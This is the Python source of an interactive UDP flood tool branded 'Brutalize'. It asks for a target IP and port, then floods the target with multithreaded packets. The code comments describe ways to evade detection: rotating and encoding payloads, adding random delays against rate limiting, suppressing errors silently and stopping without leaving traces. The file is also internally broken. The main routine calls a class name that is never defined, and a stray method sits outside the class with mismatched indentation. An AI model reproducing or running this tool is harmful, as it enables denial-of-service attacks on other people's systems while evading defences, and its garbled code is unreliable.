import base64
import zlib
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread, Lock
from random import choices, randint, uniform
from time import time, sleep
import ssl
from pystyle import *
from getpass import getpass as hinput
import hashlib

class StealthBrutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force  # default: 1250
        self.threads = threads  # default: 100
        self.lock = Lock()
        
        # Obfuscated socket creation
        self.client = self._create_stealth_socket()
        
        # Dynamic payload generation with encryption
        self.payloads = self._generate_obfuscated_payloads()
        self.current_payload = 0
        
        # Traffic shaping variables
        self.last_sent = time()
        self.send_interval = uniform(0.001, 0.01)
        
        # Statistics
        self.sent = 0
        self.total = 0
        self.on = False

    def _create_stealth_socket(self):
        """Create socket with randomized parameters"""
        sock = socket(AF_INET, SOCK_DGRAM)
        
        # Randomize socket options
        sock.setsockopt(1, 6, 1)  # SO_KEEPALIVE
        sock.setsockopt(0, 10, 1)  # SO_DEBUG
        
        return sock

    def _generate_obfuscated_payloads(self):
        """Generate multiple obfuscated payload variations"""
        payloads = []
        base_payload = "x" * self.force
        
        # Create 10 different encoded variations
        for i in range(10):
            # Rotate characters
            rotated = base_payload[i:] + base_payload[:i]
            
            # Apply different obfuscation methods
            if i % 3 == 0:
                payload = base64.b64encode(rotated.encode())
            elif i % 3 == 1:
                payload = zlib.compress(rotated.encode())
            else:
                payload = rotated.encode()
                
            payloads.append(payload)
            
        return payloads

    def _get_next_payload(self):
        """Rotate through payloads to avoid pattern detection"""
        with self.lock:
            payload = self.payloads[self.current_payload]
            self.current_payload = (self.current_payload + 1) % len(self.payloads)
            return payload

    def _random_delay(self):
        """Add random delay to avoid rate limiting"""
        sleep(uniform(0, self.send_interval))

    def flood(self):
        """Start the flood with evasion techniques"""
        self.on = True
        self.sent = 0
        self.total = 0
        self.start_time = time()
        
        # Start threads with randomized delays
        for i in range(self.threads):
            Thread(target=self._stealth_send, args=(i,)).start()
            sleep(uniform(0, 0.1))  # Stagger thread starts
            
        Thread(target=self.info).start()

    def _stealth_send(self, thread_id):
        """Modified send method with evasion techniques"""
        while self.on:
            try:
                # Get next obfuscated payload
                data = self._get_next_payload()
                
                # Randomize target port if not specified
                target_port = self.port or randint(1, 65535)
                
                # Send with random delays
                self.client.sendto(data, (self.ip, target_port))
                
                with self.lock:
                    self.sent += len(data)
                
                # Random delay between sends
                self._random_delay()
                
                # Occasionally change send interval
                if randint(1, 100) == 1:
                    self.send_interval = uniform(0.001, 0.05)
                    
            except Exception as e:
                # Silently handle errors to avoid detection
                continue

    def info(self):
        """Modified info display with less frequent updates"""
        interval = 0.1  # Less frequent updates
        now = time()
        
        size = 0
        mb = 1000000
        gb = 1000000000
        
        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * 8 / gb * interval
                print(stage(
                    f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}"
                ), end='\r')

            now2 = time()

            if now + 1 >= now2:
                continue

            size = round(self.sent * 8 / mb)
            self.sent = 0

            now += 1

    def stop(self):
        """Clean stop to avoid leaving traces"""
        self.on = False
        try:
            self.client.close()
        except:
            pass

def send(self):
    while self.on:
      try:
        self.client.sendto(self.data, self._randaddr())
        self.sent += self.len
      except:
        pass

  def _randaddr(self):
    return (self.ip, self._randport())

  def _randport(self):
    return self.port or randint(1, 65535)


ascii = r'''

$$$$$$$\                        $$\                     
$$  __$$\                       $$ |                    
$$ |  $$ | $$$$$$\  $$\   $$\ $$$$$$\    $$$$$$\        
$$$$$$$\ |$$  __$$\ $$ |  $$ |\_$$  _|  $$  __$$\       
$$  __$$\ $$ |  \__|$$ |  $$ |  $$ |    $$$$$$$$ |      
$$ |  $$ |$$ |      $$ |  $$ |  $$ |$$\ $$   ____|      
$$$$$$$  |$$ |      \$$$$$$  |  \$$$$  |\$$$$$$$\       
\_______/ \__|       \______/    \____/  \_______|      
                                                        
                                                        
                                                        
'''

banner = r"""
 @@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@@ @ @ @ @ @@@@  @@@@
          @@@@@   @@@ @ @ @ @ @@@   @@@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@
      @@@@          @@@@@@@@@@@          @@@@
   @@@@@              @@@@@@@              @@@@@
  @@@@@@@                                 @@@@@@@
   @@@@@                                   @@@@@""".replace('-', '-')

banner = Add.Add(ascii, banner, center=True)

fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white

blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
purple = Col.StaticMIX((Col.purple, blue, Col.white))


def init():
  System.Size(140, 40), System.Title(
      ".B.r.u.t.e. .-. .b.y. .S.P.A.R.K.L.E.E.".replace('.', ''))
  Cursor.HideCursor()


init()


def stage(text, symbol='...'):
  col1 = purple
  col2 = white
  return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"


def error(text, start='\n'):
  hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
  exit()


def main():
  print()
  print(
      Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)),
                        Center.XCenter(banner)))

  ip = input(stage(f"Enter the IP to Brutalize {purple}->{fluo2} ", '?'))
  print()

  try:
    if ip.count('.') != 3:
      int('error')
    int(ip.replace('.', ''))
  except:
    error("Error! Please enter a correct IP address.")

  port = input(
      stage(
          f"Enter port {purple}[{white}press {fluo2}enter{white} to attack all ports{purple}] {purple}->{fluo2} ",
          '?'))
  print()

  if port == '':
    port = None
  else:
    try:
      port = int(port)
      if port not in range(1, 65535 + 1):
        int('error')
    except ValueError:
      error("Error! Please enter a correct port.")

  force = input(
      stage(
          f"Bytes per packet {purple}[{white}press {fluo2}enter{white} for 1250{purple}] {purple}->{fluo2} ",
          '?'))
  print()

  if force == '':
    force = 1250
  else:
    try:
      force = int(force)
    except ValueError:
      error("Error! Please enter an integer.")

  threads = input(
      stage(
          f"Threads {purple}[{white}press {fluo2}enter{white} for 100{purple}] {purple}->{fluo2} ",
          '?'))
  print()

  if threads == '':
    threads = 100
  else:
    try:
      threads = int(threads)
    except ValueError:
      error("Error! Please enter an integer.")

  print()
  cport = '' if port is None else f'{purple}:{fluo2}{port}'
  print(stage(f"Starting attack on {fluo2}{ip}{cport}{white}."), end='\r')

  brute = Brutalize(ip, port, force, threads)
  try:
    brute.flood()
  except:
    brute.stop()
    error("A fatal error has occured and the attack was stopped.", '')
  try:
    while True:
      sleep(1000000)
  except KeyboardInterrupt:
    brute.stop()
    print(
        stage(
            f"Attack stopped. {fluo2}{ip}{cport}{white} was Brutalized with {fluo}{round(brute.total, 1)} {white}Gb.",
            '.'))
  print('\n')
  sleep(1)

  hinput(stage(f"Press {fluo2}enter{white} to {fluo}exit{white}.", '.'))


if __name__ == '__main__':
  main()